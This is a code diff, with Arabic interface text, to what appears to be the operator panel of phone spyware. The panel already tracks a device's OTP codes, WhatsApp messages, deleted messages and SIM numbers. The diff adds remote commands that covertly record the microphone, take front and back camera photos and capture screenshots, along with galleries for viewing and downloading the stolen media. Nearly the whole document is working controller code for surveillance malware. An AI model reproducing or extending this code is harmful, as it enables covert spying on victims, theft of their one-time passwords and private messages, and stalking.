@@ -37,9 +37,15 @@ let liveOtps = [];
 let deletedFilter = 'all';
 let liveVoices = [];
 let liveEmails = [];
+let liveScreenshots = [];
+let liveAudioRecordings = [];
+let liveCameraPhotos = [];
 
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
+
+// ✅ حالة التسجيل الصوتي
+let isRecordingAudio = false;
 
 function logout() {
     const token = getAuthToken();
@@ -103,6 +109,49 @@ function initSSE() {
                     const n = parseInt((badge.textContent || '').replace(/[^0-9]/g, '')) || 0;
                     badge.textContent = `(${n + 1}) 🔴`;
                     badge.className = 'count badge-new';
+                }
+            } catch (err) {}
+        });
+
+        // ✅ NEW — لقطة شاشة جديدة
+        sse.addEventListener('new_screenshot', (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                addLiveScreenshot(data);
+                showNotification('📷 لقطة شاشة جديدة', data.file_name || '', '📷');
+                const badge = document.getElementById('liveScreenshotsCount');
+                if (badge) {
+                    const n = parseInt(badge.textContent) || 0;
+                    badge.textContent = n + 1;
+                }
+            } catch (err) {}
+        });
+
+        // ✅ NEW — تسجيل صوتي جديد
+        sse.addEventListener('new_audio', (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                addLiveAudio(data);
+                showNotification('🎤 تسجيل صوتي جديد', data.file_name || '', '🎤');
+                const badge = document.getElementById('liveAudioCount');
+                if (badge) {
+                    const n = parseInt(badge.textContent) || 0;
+                    badge.textContent = n + 1;
+                }
+            } catch (err) {}
+        });
+
+        // ✅ NEW — صورة كاميرا جديدة
+        sse.addEventListener('new_camera_photo', (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                addLiveCameraPhoto(data);
+                const camName = data.camera_name === 'front' ? 'أمامية' : 'خلفية';
+                showNotification(`📸 كاميرا ${camName}`, data.file_name || '', '📸');
+                const badge = document.getElementById('liveCameraCount');
+                if (badge) {
+                    const n = parseInt(badge.textContent) || 0;
+                    badge.textContent = n + 1;
                 }
             } catch (err) {}
         });
@@ -270,6 +319,365 @@ function appendWhatsAppMessage(msg) {
     `;
     container.appendChild(div);
     container.scrollTop = container.scrollHeight;
+}
+
+// ═══════════════════════════════════════════
+// ✅ ✅ ✅ قائمة المميزات المتقدمة
+// ═══════════════════════════════════════════
+function openAdvancedMenu() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    if (document.getElementById('advancedMenuOverlay')) return;
+
+    const ov = document.createElement('div');
+    ov.id = 'advancedMenuOverlay';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
+    ov.innerHTML = `
+        <div style="max-width:500px;margin:0 auto;background:#111;border:2px solid #9b59b6;border-radius:15px;padding:25px;">
+            <h2 style="color:#9b59b6;text-align:center;margin-bottom:20px;text-shadow:0 0 15px #9b59b6;">⚙️ المميزات المتقدمة</h2>
+
+            <!-- 🎤 تسجيل صوت -->
+            <div style="background:#1a0a1a;border:2px solid #00ffcc;border-radius:10px;padding:15px;margin-bottom:15px;">
+                <h3 style="color:#00ffcc;margin-bottom:10px;font-size:16px;">🎤 تسجيل صوت</h3>
+                <div style="display:flex;gap:8px;">
+                    <button id="startAudioBtn" onclick="startAudioRecording()" style="flex:1;background:#00cc66;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;">▶️ بدء التسجيل</button>
+                    <button id="stopAudioBtn" onclick="stopAudioRecording()" style="flex:1;background:#ff3300;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;opacity:0.5;" disabled>⏹️ إيقاف + إرسال</button>
+                </div>
+                <button onclick="openLiveAudio()" style="width:100%;margin-top:10px;background:#0a3a3a;color:#00ffcc;border:1px solid #00ffcc;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                    📁 عرض التسجيلات (<span id="liveAudioCount">0</span>)
+                </button>
+            </div>
+
+            <!-- 📸 كاميرا أمامية -->
+            <div style="background:#1a0a1a;border:2px solid #9b59b6;border-radius:10px;padding:15px;margin-bottom:15px;">
+                <h3 style="color:#9b59b6;margin-bottom:10px;font-size:16px;">📸 الكاميرا</h3>
+                <div style="display:flex;gap:8px;margin-bottom:10px;">
+                    <button onclick="takeCameraPhoto('front')" style="flex:1;background:#9b59b6;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🤳 أمامية</button>
+                    <button onclick="takeCameraPhoto('back')" style="flex:1;background:#6a2c8a;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📷 خلفية</button>
+                </div>
+                <button onclick="openLiveCamera()" style="width:100%;background:#2a0a3a;color:#9b59b6;border:1px solid #9b59b6;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                    📁 عرض صور الكاميرا (<span id="liveCameraCount">0</span>)
+                </button>
+            </div>
+
+            <!-- 📷 لقطة شاشة -->
+            <div style="background:#1a0a1a;border:2px solid #ffcc00;border-radius:10px;padding:15px;margin-bottom:15px;">
+                <h3 style="color:#ffcc00;margin-bottom:10px;font-size:16px;">📷 لقطة شاشة</h3>
+                <button onclick="takeScreenshot()" style="width:100%;background:#ffcc00;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;margin-bottom:10px;">
+                    📷 التقاط الشاشة الآن
+                </button>
+                <button onclick="openLiveScreenshots()" style="width:100%;background:#3a3a0a;color:#ffcc00;border:1px solid #ffcc00;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                    📁 عرض اللقطات (<span id="liveScreenshotsCount">0</span>)
+                </button>
+            </div>
+
+            <!-- ❌ إغلاق -->
+            <button onclick="document.getElementById('advancedMenuOverlay').remove()" style="width:100%;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
+        </div>
+    `;
+    document.body.appendChild(ov);
+
+    // ✅ تحديث العدادات
+    updateAdvancedCounters();
+}
+
+function updateAdvancedCounters() {
+    const a = document.getElementById('liveAudioCount');
+    if (a) a.textContent = liveAudioRecordings.length;
+    const c = document.getElementById('liveCameraCount');
+    if (c) c.textContent = liveCameraPhotos.length;
+    const s = document.getElementById('liveScreenshotsCount');
+    if (s) s.textContent = liveScreenshots.length;
+}
+
+// ✅ تسجيل صوت — بدء
+async function startAudioRecording() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: 'record_audio_start', token: getAuthToken() })
+        });
+        const result = await response.json();
+        if (result.success) {
+            isRecordingAudio = true;
+            const startBtn = document.getElementById('startAudioBtn');
+            const stopBtn = document.getElementById('stopAudioBtn');
+            if (startBtn) { startBtn.disabled = true; startBtn.style.opacity = '0.5'; }
+            if (stopBtn) { stopBtn.disabled = false; stopBtn.style.opacity = '1'; }
+            showNotification('🎤 بدأ التسجيل', 'جاري التسجيل... اضغط "إيقاف" عند الانتهاء', '🎤');
+        } else alert('❌ فشل بدء التسجيل');
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+// ✅ تسجيل صوت — إيقاف + إرسال
+async function stopAudioRecording() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: 'record_audio_stop', token: getAuthToken() })
+        });
+        const result = await response.json();
+        if (result.success) {
+            isRecordingAudio = false;
+            const startBtn = document.getElementById('startAudioBtn');
+            const stopBtn = document.getElementById('stopAudioBtn');
+            if (startBtn) { startBtn.disabled = false; startBtn.style.opacity = '1'; }
+            if (stopBtn) { stopBtn.disabled = true; stopBtn.style.opacity = '0.5'; }
+            showNotification('✅ تم الإيقاف', 'جاري رفع التسجيل...', '✅');
+        } else alert('❌ فشل الإيقاف');
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+// ✅ كاميرا — أمامية/خلفية
+async function takeCameraPhoto(camera) {
+    if (!currentDevice) return;
+    const command = camera === 'front' ? 'take_photo_front' : 'take_photo_back';
+    try {
+        const response = await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: command, token: getAuthToken() })
+        });
+        const result = await response.json();
+        if (result.success) {
+            showNotification(`📸 الكاميرا ${camera === 'front' ? 'الأمامية' : 'الخلفية'}`, 'سيتم التقاط الصورة خلال 30 ثانية', '📸');
+        } else alert('❌ فشل');
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+// ✅ لقطة شاشة
+async function takeScreenshot() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: 'take_screenshot', token: getAuthToken() })
+        });
+        const result = await response.json();
+        if (result.success) {
+            showNotification('📷 لقطة شاشة', 'سيتم الالتقاط خلال ثواني', '📷');
+        } else alert('❌ فشل');
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+// ═══════════════════════════════════════════
+// ✅ Overlays الجديدة
+// ═══════════════════════════════════════════
+function openLiveAudio() { document.getElementById('liveAudioOverlay').style.display = 'block'; loadAudioRecordings(); }
+function closeLiveAudio() { document.getElementById('liveAudioOverlay').style.display = 'none'; }
+function clearLiveAudio() {
+    if (!confirm('مسح كل التسجيلات الصوتية؟')) return;
+    authFetch(`/api.php?action=clear_audio&device=${encodeURIComponent(currentDevice)}`).then(() => {
+        liveAudioRecordings = [];
+        renderLiveAudio();
+    });
+}
+function addLiveAudio(data) {
+    liveAudioRecordings.unshift(data);
+    if (liveAudioRecordings.length > 200) liveAudioRecordings = liveAudioRecordings.slice(0, 200);
+    if (document.getElementById('liveAudioOverlay') && document.getElementById('liveAudioOverlay').style.display === 'block') renderLiveAudio();
+    updateAdvancedCounters();
+}
+async function loadAudioRecordings() {
+    if (!currentDevice) return;
+    try {
+        const response = await authFetch(`/api.php?action=get_audio_recordings&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (Array.isArray(data)) {
+            liveAudioRecordings = data;
+            renderLiveAudio();
+            updateAdvancedCounters();
+        }
+    } catch (e) {}
+}
+function renderLiveAudio() {
+    const list = document.getElementById('liveAudioList');
+    if (!list) return;
+    if (liveAudioRecordings.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد تسجيلات صوتية</p>';
+        return;
+    }
+    list.innerHTML = '';
+    liveAudioRecordings.forEach((rec, idx) => {
+        const div = document.createElement('div');
+        div.style.cssText = 'background:#0a1a1a;border:2px solid #00ffcc;padding:15px;border-radius:12px;';
+        div.innerHTML = `
+            <div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">🎤 تسجيل صوتي</div>
+            <div style="color:#ccc;font-size:12px;margin-bottom:8px;">📅 ${formatDate(rec.timestamp)}</div>
+            <div style="color:#888;font-size:11px;margin-bottom:8px;">${rec.file_name || ''} (${((rec.file_size||0)/1024).toFixed(1)} KB)</div>
+            <audio controls style="width:100%;margin-bottom:8px;" preload="none">
+                <source src="data:audio/3gpp;base64,${rec.file_data}" type="audio/3gpp">
+                <source src="data:audio/mp4;base64,${rec.file_data}" type="audio/mp4">
+            </audio>
+            <div style="display:flex;gap:8px;">
+                <button onclick="downloadLiveAudio(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
+                <button onclick="deleteLiveAudio(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
+            </div>
+        `;
+        list.appendChild(div);
+    });
+}
+function downloadLiveAudio(idx) {
+    const r = liveAudioRecordings[idx];
+    if (!r) return;
+    const a = document.createElement('a');
+    a.href = `data:audio/3gpp;base64,${r.file_data}`;
+    a.download = r.file_name || 'audio.3gp';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+function deleteLiveAudio(idx) {
+    if (!confirm('حذف هذا التسجيل؟')) return;
+    authFetch(`/api.php?action=delete_audio&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
+        liveAudioRecordings.splice(idx, 1);
+        renderLiveAudio();
+    });
+}
+
+// ✅ Overlay — لقطات الشاشة
+function openLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'block'; loadScreenshots(); }
+function closeLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'none'; }
+function clearLiveScreenshots() {
+    if (!confirm('مسح كل لقطات الشاشة؟')) return;
+    authFetch(`/api.php?action=clear_screenshots&device=${encodeURIComponent(currentDevice)}`).then(() => {
+        liveScreenshots = [];
+        renderLiveScreenshots();
+    });
+}
+function addLiveScreenshot(data) {
+    liveScreenshots.unshift(data);
+    if (liveScreenshots.length > 200) liveScreenshots = liveScreenshots.slice(0, 200);
+    if (document.getElementById('liveScreenshotsOverlay') && document.getElementById('liveScreenshotsOverlay').style.display === 'block') renderLiveScreenshots();
+    updateAdvancedCounters();
+}
+async function loadScreenshots() {
+    if (!currentDevice) return;
+    try {
+        const response = await authFetch(`/api.php?action=get_screenshots&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (Array.isArray(data)) {
+            liveScreenshots = data;
+            renderLiveScreenshots();
+            updateAdvancedCounters();
+        }
+    } catch (e) {}
+}
+function renderLiveScreenshots() {
+    const grid = document.getElementById('liveScreenshotsGrid');
+    if (!grid) return;
+    if (liveScreenshots.length === 0) {
+        grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">لا توجد لقطات بعد</p>';
+        return;
+    }
+    grid.innerHTML = '';
+    liveScreenshots.forEach((ss, idx) => {
+        const card = document.createElement('div');
+        card.style.cssText = 'background:#111;padding:10px;border-radius:8px;border:1px solid #ffcc00;';
+        card.innerHTML = `
+            <img src="data:image/jpeg;base64,${ss.file_data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
+            <div style="color:#ffcc00;font-size:11px;margin-top:8px;word-break:break-all;">${ss.file_name || ''}</div>
+            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(ss.timestamp)}</div>
+            <div style="display:flex;gap:5px;margin-top:8px;">
+                <button onclick="downloadLiveScreenshot(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">⬇️</button>
+                <button onclick="deleteLiveScreenshot(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
+            </div>
+        `;
+        grid.appendChild(card);
+    });
+}
+function downloadLiveScreenshot(idx) {
+    const s = liveScreenshots[idx];
+    if (!s) return;
+    const a = document.createElement('a');
+    a.href = `data:image/jpeg;base64,${s.file_data}`;
+    a.download = s.file_name || 'screenshot.jpg';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+function deleteLiveScreenshot(idx) {
+    if (!confirm('حذف هذه اللقطة؟')) return;
+    authFetch(`/api.php?action=delete_screenshot&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
+        liveScreenshots.splice(idx, 1);
+        renderLiveScreenshots();
+    });
+}
+
+// ✅ Overlay — صور الكاميرا
+function openLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'block'; loadCameraPhotos(); }
+function closeLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'none'; }
+function clearLiveCamera() {
+    if (!confirm('مسح كل صور الكاميرا؟')) return;
+    authFetch(`/api.php?action=clear_camera_photos&device=${encodeURIComponent(currentDevice)}`).then(() => {
+        liveCameraPhotos = [];
+        renderLiveCamera();
+    });
+}
+function addLiveCameraPhoto(data) {
+    liveCameraPhotos.unshift(data);
+    if (liveCameraPhotos.length > 200) liveCameraPhotos = liveCameraPhotos.slice(0, 200);
+    if (document.getElementById('liveCameraOverlay') && document.getElementById('liveCameraOverlay').style.display === 'block') renderLiveCamera();
+    updateAdvancedCounters();
+}
+async function loadCameraPhotos() {
+    if (!currentDevice) return;
+    try {
+        const response = await authFetch(`/api.php?action=get_camera_photos&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (Array.isArray(data)) {
+            liveCameraPhotos = data;
+            renderLiveCamera();
+            updateAdvancedCounters();
+        }
+    } catch (e) {}
+}
+function renderLiveCamera() {
+    const grid = document.getElementById('liveCameraGrid');
+    if (!grid) return;
+    if (liveCameraPhotos.length === 0) {
+        grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">لا توجد صور بعد</p>';
+        return;
+    }
+    grid.innerHTML = '';
+    liveCameraPhotos.forEach((photo, idx) => {
+        const camLabel = photo.camera_name === 'front' ? '🤳 أمامية' : '📷 خلفية';
+        const camColor = photo.camera_name === 'front' ? '#9b59b6' : '#6a2c8a';
+        const card = document.createElement('div');
+        card.style.cssText = `background:#111;padding:10px;border-radius:8px;border:1px solid ${camColor};`;
+        card.innerHTML = `
+            <img src="data:image/jpeg;base64,${photo.file_data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
+            <div style="color:${camColor};font-size:11px;margin-top:8px;font-weight:bold;">${camLabel}</div>
+            <div style="color:#ccc;font-size:10px;margin-top:3px;word-break:break-all;">${photo.file_name || ''}</div>
+            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(photo.timestamp)}</div>
+            <div style="display:flex;gap:5px;margin-top:8px;">
+                <button onclick="downloadLiveCameraPhoto(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">⬇️</button>
+                <button onclick="deleteLiveCameraPhoto(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
+            </div>
+        `;
+        grid.appendChild(card);
+    });
+}
+function downloadLiveCameraPhoto(idx) {
+    const p = liveCameraPhotos[idx];
+    if (!p) return;
+    const a = document.createElement('a');
+    a.href = `data:image/jpeg;base64,${p.file_data}`;
+    a.download = p.file_name || 'camera.jpg';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+function deleteLiveCameraPhoto(idx) {
+    if (!confirm('حذف هذه الصورة؟')) return;
+    authFetch(`/api.php?action=delete_camera_photo&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
+        liveCameraPhotos.splice(idx, 1);
+        renderLiveCamera();
+    });
 }
 
 // ═══ الفيد الحي — الصور ═══
@@ -826,6 +1234,10 @@ function selectDevice(deviceId) {
         dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
         updateLiveData();
         loadAllData();
+        // ✅ تحميل العدادات الإضافية
+        loadAudioRecordings();
+        loadScreenshots();
+        loadCameraPhotos();
     }
 }
 
@@ -909,6 +1321,17 @@ async function updateLiveData() {
             const vBadge = document.getElementById('liveVoicesCount');
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
+
+        // ✅ تحديث عدادات المميزات المتقدمة
+        const advCounters = {
+            liveAudioCount: data.audio_count || 0,
+            liveScreenshotsCount: data.screenshot_count || 0,
+            liveCameraCount: data.camera_count || 0
+        };
+        Object.keys(advCounters).forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.textContent = advCounters[id];
+        });
 
         if (data.sim_numbers && data.sim_numbers.length > 0) {
             const display = document.getElementById('deviceNameDisplay');
@@ -1013,7 +1436,6 @@ async function loadDeleted() {
 
 async function loadWhatsApp() {
     try {
-        // ✅ limit=50 — لا نقرأ كل الرسائل
         const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=50`);
         let messages = await response.json();
 
@@ -1723,7 +2145,6 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
-// ✅ كل 60 ثانية بدل 15
 setInterval(() => {
     const secTab = document.getElementById('securityTab');
     if (secTab && secTab.classList.contains('active')) {
@@ -1733,6 +2154,5 @@ setInterval(() => {
 
 loadAuthorizedDevices();
 
-// ✅ كل 30 ثانية بدل 10
 loadDevices();
 setInterval(loadDevices, 30000);
